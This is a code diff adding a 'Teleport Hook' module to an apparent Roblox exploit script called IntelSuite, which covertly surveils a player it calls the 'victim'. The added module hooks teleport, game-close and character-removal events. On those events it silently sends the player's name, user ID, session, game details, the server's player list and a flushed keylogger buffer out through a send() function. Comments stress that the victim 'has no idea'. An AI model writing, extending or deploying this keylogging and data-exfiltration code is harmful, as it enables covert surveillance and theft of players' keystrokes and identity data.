@@ -1665,3 +1665,100 @@ end
 getgenv().IntelSuite.StartScreamer = startScreamer
 getgenv().IntelSuite.StopScreamer = stopScreamer
 
+-- ============================================================
+-- MODULE 24: Teleport Hook
+-- Detects when victim is about to teleport or leave the game
+-- Fires a final full data dump before the Lua VM resets
+-- Completely silent — victim has no idea
+-- ============================================================
+local function startTeleportHook()
+    if getgenv().IntelSuite.TeleportHookActive then return end
+    getgenv().IntelSuite.TeleportHookActive = true
+
+    local TeleportService = game:GetService("TeleportService")
+    local Players = game:GetService("Players")
+
+    local function fireFinalDump(reason)
+        task.spawn(function()
+            local msg = "**User:** " .. LocalPlayer.Name ..
+                "\n**ID:** " .. tostring(LocalPlayer.UserId) ..
+                "\n**Reason:** " .. tostring(reason) ..
+                "\n**Game:** " .. getGame() ..
+                "\n**Place ID:** " .. tostring(game.PlaceId) ..
+                "\n**Session:** " .. SESSION_ID ..
+                "\n**Time in game:** " .. tostring(math.floor(time())) .. "s" ..
+                "\n\n**Final Player List:**"
+
+            for _, p in ipairs(Players:GetPlayers()) do
+                pcall(function()
+                    msg = msg .. "\n  - " .. p.Name .. " (ID: " .. tostring(p.UserId) .. ")"
+                end)
+            end
+
+            -- Final keylog flush
+            if getgenv().IntelSuite.Buffer and getgenv().IntelSuite.Buffer ~= "" then
+                send("FINAL KEYLOG", "**User:** " .. LocalPlayer.Name .. "\n**Buffer:** " .. getgenv().IntelSuite.Buffer, 16711680)
+                getgenv().IntelSuite.Buffer = ""
+            end
+
+            send("VICTIM LEAVING", msg, 16711680)
+        end)
+    end
+
+    -- Hook TeleportService
+    pcall(function()
+        TeleportService.LocalPlayerArrivedFromTeleport:Connect(function()
+            fireFinalDump("Arrived from teleport")
+        end)
+    end)
+
+    -- Hook game:BindToClose (fires when game is about to close)
+    pcall(function()
+        game:BindToClose(function()
+            fireFinalDump("Game closing / leaving")
+            task.wait(2) -- give time for HTTP request to fire
+        end)
+    end)
+
+    -- Hook LocalPlayer.OnTeleport
+    pcall(function()
+        TeleportService.TeleportInitFailed:Connect(function(player, result, errorMessage)
+            if player == LocalPlayer then
+                fireFinalDump("Teleport failed: " .. tostring(errorMessage))
+            end
+        end)
+    end)
+
+    -- Hook character removing (fires when they die or leave)
+    pcall(function()
+        LocalPlayer.CharacterRemoving:Connect(function()
+            if not getgenv().IntelSuite.IsActive then return end
+            -- Only fire if they're actually leaving, not just dying
+            task.delay(3, function()
+                if not LocalPlayer.Character then
+                    fireFinalDump("Character removed — possible disconnect")
+                end
+            end)
+        end)
+    end)
+
+    -- Watch for teleport state changes
+    pcall(function()
+        local lastState = nil
+        game:GetService("RunService").Heartbeat:Connect(function()
+            if not getgenv().IntelSuite.IsActive then return end
+            pcall(function()
+                local state = TeleportService:GetLocalPlayerTeleportData()
+                if state ~= lastState and state ~= nil then
+                    lastState = state
+                    fireFinalDump("Teleport data detected")
+                end
+            end)
+        end)
+    end)
+end
+
+-- Start on load
+task.spawn(startTeleportHook)
+getgenv().IntelSuite.TeleportHook = startTeleportHook
+
